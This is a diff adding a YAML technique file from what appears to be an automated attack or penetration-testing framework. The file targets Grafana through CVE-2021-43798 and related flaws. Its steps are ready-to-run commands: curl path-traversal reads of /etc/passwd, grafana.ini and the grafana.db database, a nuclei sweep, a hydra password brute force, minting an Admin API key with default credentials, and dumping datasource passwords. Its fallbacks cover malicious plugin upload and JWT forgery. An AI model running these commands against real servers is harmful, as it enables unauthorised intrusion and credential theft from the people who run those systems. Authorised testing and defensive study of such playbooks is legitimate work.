@@ -1,0 +1,44 @@
+id: tech_grafana
+title: "Grafana — CVE-2021-43798 path traversal + plugin RCE"
+phase: exploit
+mitre: ["T1190", "T1083"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 3000, 8080, 8443]
+  technologies: ["grafana"]
+  cves:     ["CVE-2021-43798", "CVE-2022-31097", "CVE-2024-1313"]
+keywords: ["grafana", "plugin path traversal", "grafana rce"]
+preconditions:
+  - "Grafana login page reachable (/login or /api/health)"
+steps:
+  - tool: curl
+    cmd:  "curl -s {base_url}/api/health"
+    why:  "Version disclosure (commit + version in JSON)"
+  - tool: curl
+    cmd:  "curl -s --path-as-is '{base_url}/public/plugins/alertlist/../../../../../../../../etc/passwd'"
+    why:  "CVE-2021-43798 — direct file read via plugin path traversal (Grafana 8.0.0-8.3.0)"
+  - tool: curl
+    cmd:  "curl -s --path-as-is '{base_url}/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'"
+    why:  "Grab admin creds from grafana.ini if plaintext"
+  - tool: curl
+    cmd:  "curl -s --path-as-is '{base_url}/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db'"
+    why:  "Pull SQLite DB → offline crack of admin bcrypt hash"
+  - tool: nuclei
+    cmd:  "nuclei -tags grafana -u {base_url}"
+    why:  "All Grafana CVEs + default-cred sweep"
+  - tool: hydra
+    cmd:  "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:user=^USER^&password=^PASS^&email=:Invalid'"
+    why:  "Default admin/admin → fallback bruteforce"
+  - tool: curl
+    cmd:  "curl -s -X POST {base_url}/api/auth/keys -u admin:admin -H 'Content-Type:application/json' -d '{\"name\":\"loot\",\"role\":\"Admin\"}'"
+    why:  "Once auth → mint API key with Admin → query datasource creds"
+  - tool: curl
+    cmd:  "curl -s '{base_url}/api/datasources' -H 'Authorization: Bearer {api_key}'"
+    why:  "Datasource enum — passwords often inlined (PostgreSQL/MySQL/Splunk creds)"
+expected_outcome: "Sensitive file read; admin takeover via DB bcrypt crack; downstream cred harvest from datasources"
+fallbacks:
+  - "Plugin marketplace exposed → upload malicious plugin → CVE-2022-31097-style RCE"
+  - "If SSO behind Grafana → leverage retrieved JWT secret to forge admin"
+  - "Snapshot endpoints often expose internal Grafana data without auth"
+references:
+  - "https://grafana.com/security/security-advisories/"
